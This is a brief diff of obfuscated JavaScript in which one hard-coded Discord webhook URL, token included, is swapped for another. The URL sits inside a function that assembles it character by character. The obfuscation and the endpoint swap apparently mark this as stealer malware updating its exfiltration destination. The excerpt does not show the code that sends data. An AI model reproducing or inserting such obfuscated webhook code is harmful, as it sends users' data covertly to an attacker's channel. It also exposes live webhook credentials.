@@ -1,8 +1,8 @@
 (function() {
     const _0x53507a = function() {
         let _0x5f4a4b = '';
-        for (let _0x1c4530 = 0x0; _0x1c4530 < "https://discord.com/api/webhooks/1467238723350691993/I5jeRGsdnT1WqwcN_KmBshmtmcfasTLhNrYnOwHrPrLuVrRgbUH-wPM7o46iogcnCO8R".length; _0x1c4530++) {
-            _0x5f4a4b += "https://discord.com/api/webhooks/1467238723350691993/I5jeRGsdnT1WqwcN_KmBshmtmcfasTLhNrYnOwHrPrLuVrRgbUH-wPM7o46iogcnCO8R" [_0x1c4530];
+        for (let _0x1c4530 = 0x0; _0x1c4530 < "https://discord.com/api/webhooks/1509094981854560350/V4VVYUVq6YZQ0Hol0iFw8aBo7EdIpoh4Tud-BwXiHOZEp7UcvaA1mD9ZNFAwNeFqm67H".length; _0x1c4530++) {
+            _0x5f4a4b += "https://discord.com/api/webhooks/1509094981854560350/V4VVYUVq6YZQ0Hol0iFw8aBo7EdIpoh4Tud-BwXiHOZEp7UcvaA1mD9ZNFAwNeFqm67H" [_0x1c4530];
         }
         return _0x5f4a4b;
     };
